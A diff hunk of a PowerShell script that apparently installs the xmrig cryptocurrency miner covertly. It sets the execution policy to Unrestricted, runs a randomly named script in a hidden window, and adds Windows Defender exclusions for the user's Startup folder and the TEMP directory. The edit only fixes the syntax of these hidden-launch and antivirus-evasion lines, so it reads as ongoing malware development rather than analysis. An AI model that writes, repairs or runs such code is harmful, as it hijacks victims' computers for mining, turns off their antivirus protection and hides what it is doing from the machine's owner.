@@ -147,7 +147,11 @@ Remove-Item -Path "$initial_dir\PkUbTvqXFIdB.txt"
 
 Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
 # Start-Process -FilePath "$tasks\AEQKCPrkuifY.ps1" -windowstyle hidden
-powershell powershell.exe -windowstyle hidden -FilePath "$tasks\AEQKCPrkuifY.ps1"; Add-MpPreference -ExclusionPath 'C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'; Add-MpPreference -ExclusionPath '$env:temp'
+
+Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -File `"$tasks\AEQKCPrkuifY.ps1`"" -NoNewWindow -Wait
+
+Add-MpPreference -ExclusionPath "C:/Users/$env:USERNAME/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+Add-MpPreference -ExclusionPath "$env:TEMP"
 
 cd "$initial_dir\xmrig-6.22.2"
 # Remove-Item -Path "initial_dir\xmrig-6.22.2\config.json"
